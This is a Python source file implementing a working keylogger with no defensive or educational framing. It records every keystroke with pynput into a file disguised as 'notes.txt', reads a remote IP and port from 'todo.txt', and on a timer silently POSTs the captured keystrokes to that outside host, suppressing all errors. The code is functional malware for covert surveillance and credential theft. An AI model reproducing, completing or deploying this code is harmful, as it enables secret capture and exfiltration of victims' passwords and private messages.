from pynput import keyboard
import requests
import json
import threading

class Keylogger:
    def __init__(self):
        try:
            with open("todo.txt", "r") as f:
                lines = f.readlines()
                self.ip_address = lines[0].strip()
                self.interval = int(lines[1])
                self.port = lines[2]
                f.close()
        except:
            pass

        self.keys = ""

    def send(self):
        try:
            with open("notes.txt", "r") as f:
                payload = json.dumps({"content": f.read()})
                requests.post(f"http://{self.ip_address}:{self.port}", data=payload, headers={"Content-Type": "application/json"})
        except:
            pass
        finally:
            try:
                timer = threading.Timer(self.interval, self.send)
                timer.start()
            except:
                pass

    def on_press(self, key):
        with open("notes.txt", "w", encoding="utf-8") as f:
            if key == keyboard.Key.enter:
                self.keys += "\n"
                f.write(self.keys)
            elif key == keyboard.Key.tab:
                self.keys += "\t"
                f.write(self.keys)
            elif key == keyboard.Key.space:
                self.keys += " "
                f.write(self.keys)
            elif key == keyboard.Key.shift:
                self.keys += "'shift'"
                f.write(self.keys)
            elif key == keyboard.Key.backspace:
                self.keys += "'backspace'"
                f.write(self.keys)
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.keys += "'ctrl'"
                f.write(self.keys)
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                self.keys += "'alt'"
                f.write(self.keys)
            elif key == keyboard.Key.esc:
                self.keys += "'esc'"
                f.write(self.keys)
            elif key == keyboard.Key.caps_lock:
                self.keys += "'caps_lock'"
                f.write(self.keys)
            elif key == keyboard.Key.delete:
                self.keys += "'del'"
                f.write(self.keys)
            elif key == keyboard.Key.cmd:
                self.keys += "'cmd'"
                f.write(self.keys)
            else:
                self.keys += str(key).strip("'")
                f.write(self.keys)
    
    def run(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.send()
            listener.join()

#Logger = Keylogger()
#Logger.run()
